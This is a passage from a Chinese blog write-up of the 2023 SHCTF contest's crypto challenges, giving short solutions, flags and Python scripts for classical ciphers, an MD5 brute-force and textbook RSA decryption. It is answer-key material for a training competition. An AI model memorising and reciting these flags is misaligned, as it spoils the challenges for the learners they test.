      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">k = <span class="string">&#x27;KCLWG?K8M9O3?DE?84S9&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    temp1 = k.replace(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">chr</span>(<span class="number">65</span> + i)), <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        temp2 = temp1.replace(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">chr</span>(<span class="number">65</span> + j), <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">            temp3 = temp2.replace(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">chr</span>(<span class="number">65</span> + n), <span class="number">1</span>)</span><br><span class="line">            s = hashlib.md5(temp3.encode(<span class="string">&#x27;utf8&#x27;</span>)).hexdigest().upper()</span><br><span class="line">            <span class="keyword">if</span> s[:<span class="number">4</span>] == <span class="string">&#x27;F0AF&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&#x27;flag&#123;&#x27;</span>+s+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/10/05/2023SHCTF/10.png"></p>

        <h2 id="WEEK1-okk">
          <a href="#WEEK1-okk" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEEK1-okk" class="headerlink" title="[WEEK1]okk"></a>[WEEK1]okk</h2>
      <p>一眼okk编码直接使用<code>https://www.splitbrain.org/services/ook</code>进行解密<br>flag{123456789}</p>

        <h2 id="WEEK1-熊斐特">
          <a href="#WEEK1-熊斐特" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEEK1-熊斐特" class="headerlink" title="[WEEK1]熊斐特"></a>[WEEK1]熊斐特</h2>
      <p>描述：熊斐特博士发现了一种新的密码。<code>uozt&#123;zgyzhs xrksvi&#125;</code><br>Atbash解码:FLAG{ATBASH CIPHER}</p>

        <h2 id="WEEK1-黑暗之歌">
          <a href="#WEEK1-黑暗之歌" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEEK1-黑暗之歌" class="headerlink" title="[WEEK1]黑暗之歌"></a>[WEEK1]黑暗之歌</h2>
      <p>密文：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">⠴⡰⡭⡳⠴⡰⡭⡰⡷⡲⡢⡩⡭⡡⠯⡩⡭⡡⡺⡩⡭⡡⠳⡩⡭⡡⡺⡩⡭⡡⡶⡩⡭⡡⡶⡩⡭⡡⡲⡩⡭⡡⡺⡩⡭⡡⠯⡩⡧⡊⡢⡩⡭⡡⠯⡩⡭⡡⡺⡃⡰⠫⡋⡚⡲⡍⡋⡮⠴⡰⡭⡶⡷⡲⡢⡩⡧⡊⡢⡃⡴⡵⡋⡁⡬⡵⡋⡁⡬⡵⡋⡁⡬⡳⡋⠲⠴⡯⡃⡗⠴⡰⡭⡴⠴⡰⡭⡶⡷⡲⡢⡩⡧⡊⡢⡩⡭⡡⡺⡩⡭⡡⡺⡩⡭⡡⠳⡩⡧⡊⡢⡩⡭⡡⠯⡩⡧⡊⡢⡃⡴⡵⡋⡚⡱⠫⡋⡚⡱⠫⡋⡚⡲⠵⠲⡺⠰⠽</span><br></pre></td></tr></table></div></figure>
<p>盲文解密 –&gt; base64 –&gt; 音符密码<br>flag{b2cc-9091-8a29}</p>

        <h2 id="WEEK1-迷雾重重">
          <a href="#WEEK1-迷雾重重" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEEK1-迷雾重重" class="headerlink" title="[WEEK1]迷雾重重"></a>[WEEK1]迷雾重重</h2>
      <p>莫斯密码<br>FLAG{MORSE_IS_VERY_FUN}</p>

        <h2 id="WEEK1-难言的遗憾">
          <a href="#WEEK1-难言的遗憾" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEEK1-难言的遗憾" class="headerlink" title="[WEEK1]难言的遗憾"></a>[WEEK1]难言的遗憾</h2>
      <p>描述：我们本可以早些进入信息化时代的，但是清政府拒不采纳那份编码规则。 （注：flag为中文，使用flag{}包裹提交）<br>中文电报码解码: flag{一天不学高数我就魂身难受}</p>

        <h2 id="WEEK1-小兔子可爱捏">
          <a href="#WEEK1-小兔子可爱捏" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEEK1-小兔子可爱捏" class="headerlink" title="[WEEK1]小兔子可爱捏"></a>[WEEK1]小兔子可爱捏</h2>
      <p>题目描述：宇宙的终极答案是什么？<code>U2FsdGVkX1/lKCKZm7Nw9xHLMrKHsbGQuFJU5QeUdASq3Ulcrcv9</code><br>rabbit密码，key为42；flag{i_love_technology}</p>

        <h2 id="WEEK1-what-is-m">
          <a href="#WEEK1-what-is-m" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEEK1-what-is-m" class="headerlink" title="[WEEK1]what is m"></a>[WEEK1]what is m</h2>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;m =&quot;</span>,m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># m = 7130439814059477382855563353906372398919900016616223069580645592349221130130388873192795189874110475344017518129521076889460992145696045687510866045009759706871831702092885897757211131196541</span></span><br></pre></td></tr></table></div></figure>
<p>此时该代码的作用是将flag变量中的字节数组转换为一个大整数，并将结果存储在m变量中；那么此时我们可以写一个脚本将大整数转换为字节数组</p>

        <h3 id="exp-4">
          <a href="#exp-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">long_to_bytes</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="comment"># 计算字节数</span></span><br><span class="line">    num_bytes = (n.bit_length() + <span class="number">7</span>) // <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用.to_bytes方法将大整数转换为字节数组</span></span><br><span class="line">    byte_array = n.to_bytes(num_bytes, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> byte_array</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例用法</span></span><br><span class="line">n = <span class="number">7130439814059477382855563353906372398919900016616223069580645592349221130130388873192795189874110475344017518129521076889460992145696045687510866045009759706871831702092885897757211131196541</span></span><br><span class="line">byte_array = long_to_bytes(n)</span><br><span class="line"><span class="built_in">print</span>(byte_array)</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/10/05/2023SHCTF/11.png"></p>

        <h2 id="WEEK1-really-ez-rsa">
          <a href="#WEEK1-really-ez-rsa" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEEK1-really-ez-rsa" class="headerlink" title="[WEEK1]really_ez_rsa"></a>[WEEK1]really_ez_rsa</h2>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line">n = p * q</span><br><span class="line">m = bytes_to_long(m)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q =&quot;</span>, q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = 217873395548207236847876059475581824463</span></span><br><span class="line"><span class="comment"># q = 185617189161086060278518214521453878483</span></span><br><span class="line"><span class="comment"># c = 6170206647205994850964798055359827998224330552323068751708721001188295410644</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br></pre></td></tr></table></div></figure>
<p>此时的pqce都已经给出，那么此时我们只需要直接解密即可</p>

        <h3 id="exp-5">
          <a href="#exp-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex, b2a_hex</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;*****************&quot;</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">217873395548207236847876059475581824463</span></span><br><span class="line">q = <span class="number">185617189161086060278518214521453878483</span></span><br><span class="line">c = <span class="number">6170206647205994850964798055359827998224330552323068751708721001188295410644</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p * q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/10/05/2023SHCTF/12.png"></p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ FIN ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Autor: </span><span class="copyright-author__value"><a href="https://hyggevv.github.io">hey</a></span></div><div class="copyright-link"><span class="copyright-link__name">Enlace: </span><span class="copyright-link__value"><a href="https://hyggevv.github.io/2023/10/05/2023SHCTF/">https://hyggevv.github.io/2023/10/05/2023SHCTF/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">Todos los artículos de este blog están bajo licencia  de <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> a menos que se indique lo contrario</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/10/29/%E7%A6%8F%E5%BB%BA%E7%9C%81%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">2023年全国工业和信息化技术技能大赛(工业互联网安全福建省选拔赛)复盘</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/09/29/%E7%AB%99%E5%9C%A8%E5%B7%A8%E4%BA%BA%E7%9A%84%E8%82%A9%E8%86%80%E4%B8%8A%E7%9C%8B%E6%94%BB%E9%98%B2/"><span class="paginator-prev__text">站在巨人的肩膀上看攻防</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Contenido</span><span class="sidebar-nav-ov">Reseña</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">
          WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK1-babyRCE"><span class="toc-number">1.1.</span> <span class="toc-text">
          [WEEK1]babyRCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.1.1.</span> <span class="toc-text">
          源码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">1.1.2.</span> <span class="toc-text">
          payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK1-1zzphp"><span class="toc-number">1.2.</span> <span class="toc-text">
          [WEEK1]1zzphp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">
          源码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.2.2.</span> <span class="toc-text">
          exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK1-ez-serialize"><span class="toc-number">1.3.</span> <span class="toc-text">
          [WEEK1]ez_serialize</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">
          源码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE"><span class="toc-number">1.3.2.</span> <span class="toc-text">
          反序列化链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-number">1.3.3.</span> <span class="toc-text">
          exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload-1"><span class="toc-number">1.3.4.</span> <span class="toc-text">
          payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK1-%E7%99%BB%E5%BD%95%E5%B0%B1%E7%BB%99flag"><span class="toc-number">1.4.</span> <span class="toc-text">
          [WEEK1]登录就给flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rockyou"><span class="toc-number">1.4.1.</span> <span class="toc-text">
          rockyou</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK1-%E9%A3%9E%E6%9C%BA%E5%A4%A7%E6%88%98"><span class="toc-number">1.5.</span> <span class="toc-text">
          [WEEK1]飞机大战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JS"><span class="toc-number">1.5.1.</span> <span class="toc-text">
          JS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK1-%E7%94%9F%E6%88%90%E4%BD%A0%E7%9A%84%E9%82%80%E8%AF%B7%E5%87%BD%E5%90%A7"><span class="toc-number">1.6.</span> <span class="toc-text">
          [WEEK1]生成你的邀请函吧~</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK2-ez-ssti"><span class="toc-number">1.7.</span> <span class="toc-text">
          [WEEK2]ez_ssti</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fenjing%E8%87%AA%E5%8A%A8%E5%8C%96"><span class="toc-number">1.7.1.</span> <span class="toc-text">
          fenjing自动化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK2-EasyCMS"><span class="toc-number">1.8.</span> <span class="toc-text">
          [WEEK2]EasyCMS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-number">1.8.1.</span> <span class="toc-text">
          指纹识别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Taocms-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.8.2.</span> <span class="toc-text">
          Taocms 代码注入漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK2-no-wake-up"><span class="toc-number">1.9.</span> <span class="toc-text">
          [WEEK2]no_wake_up</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.9.1.</span> <span class="toc-text">
          代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wakeup%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.9.2.</span> <span class="toc-text">
          wakeup的绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK2-serialize"><span class="toc-number">1.10.</span> <span class="toc-text">
          [WEEK2]serialize</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1"><span class="toc-number">1.10.1.</span> <span class="toc-text">
          代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%9C%B0%E5%9D%80%E5%BC%95%E7%94%A8"><span class="toc-number">1.10.2.</span> <span class="toc-text">
          反序列化之地址引用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%85%E6%8B%B7%E8%B4%9D"><span class="toc-number">1.10.2.1.</span> <span class="toc-text">
          浅拷贝</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-number">1.10.3.</span> <span class="toc-text">
          exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK2-ez-rce"><span class="toc-number">1.11.</span> <span class="toc-text">
          [WEEK2]ez_rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK2-MD5%E7%9A%84%E4%BA%8B%E5%B0%B1%E6%8B%9C%E6%89%98%E4%BA%86"><span class="toc-number">1.12.</span> <span class="toc-text">
          [WEEK2]MD5的事就拜托了</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#parse-url%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">1.12.1.</span> <span class="toc-text">
          parse_url变量覆盖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#intval%E7%89%B9%E6%80%A7"><span class="toc-number">1.12.2.</span> <span class="toc-text">
          intval特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hash%E6%8B%93%E5%B1%95%E9%95%BF%E5%BA%A6%E6%94%BB%E5%87%BB"><span class="toc-number">1.12.3.</span> <span class="toc-text">
          hash拓展长度攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK3-gogogo"><span class="toc-number">1.13.</span> <span class="toc-text">
          [WEEK3]gogogo</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">2.</span> <span class="toc-text">
          Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK1-Crypto-Checkin"><span class="toc-number">2.1.</span> <span class="toc-text">
          [WEEK1]Crypto_Checkin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK1-%E5%87%AF%E6%92%92%E5%A4%A7%E5%B8%9D"><span class="toc-number">2.2.</span> <span class="toc-text">
          [WEEK1]凯撒大帝</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK1-%E8%BF%9B%E5%88%B6"><span class="toc-number">2.3.</span> <span class="toc-text">
          [WEEK1]进制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK1-%E6%AE%8B%E7%BC%BA%E7%9A%84md5"><span class="toc-number">2.4.</span> <span class="toc-text">
          [WEEK1]残缺的md5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-3"><span class="toc-number">2.4.1.</span> <span class="toc-text">
          exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK1-okk"><span class="toc-number">2.5.</span> <span class="toc-text">
          [WEEK1]okk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK1-%E7%86%8A%E6%96%90%E7%89%B9"><span class="toc-number">2.6.</span> <span class="toc-text">
          [WEEK1]熊斐特</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK1-%E9%BB%91%E6%9A%97%E4%B9%8B%E6%AD%8C"><span class="toc-number">2.7.</span> <span class="toc-text">
          [WEEK1]黑暗之歌</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK1-%E8%BF%B7%E9%9B%BE%E9%87%8D%E9%87%8D"><span class="toc-number">2.8.</span> <span class="toc-text">
          [WEEK1]迷雾重重</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK1-%E9%9A%BE%E8%A8%80%E7%9A%84%E9%81%97%E6%86%BE"><span class="toc-number">2.9.</span> <span class="toc-text">
          [WEEK1]难言的遗憾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK1-%E5%B0%8F%E5%85%94%E5%AD%90%E5%8F%AF%E7%88%B1%E6%8D%8F"><span class="toc-number">2.10.</span> <span class="toc-text">
          [WEEK1]小兔子可爱捏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK1-what-is-m"><span class="toc-number">2.11.</span> <span class="toc-text">
          [WEEK1]what is m</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-4"><span class="toc-number">2.11.1.</span> <span class="toc-text">
          exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEEK1-really-ez-rsa"><span class="toc-number">2.12.</span> <span class="toc-text">
          [WEEK1]really_ez_rsa</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-5"><span class="toc-number">2.12.1.</span> <span class="toc-text">
          exp</span></a></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/usually.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">hey</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">120</div><div class="sidebar-ov-state-item__name">Archivo</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Categorías</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Etiquetas</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">Has leído </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2025</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>hey</span></div><div><span>Potenciado por <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.2</span><span class="footer__devider">|</span><span>Tema - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.7.0</span></div><div class="busuanzi"><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">Vistas</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.7.0"></script><script src="/js/stun-boot.js?v=2.7.0"></script><script src="/js/scroll.js?v=2.7.0"></script><script src="/js/header.js?v=2.7.0"></script><script src="/js/sidebar.js?v=2.7.0"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":180,"height":300},"mobile":{"show":true},"log":false});</script></body></html>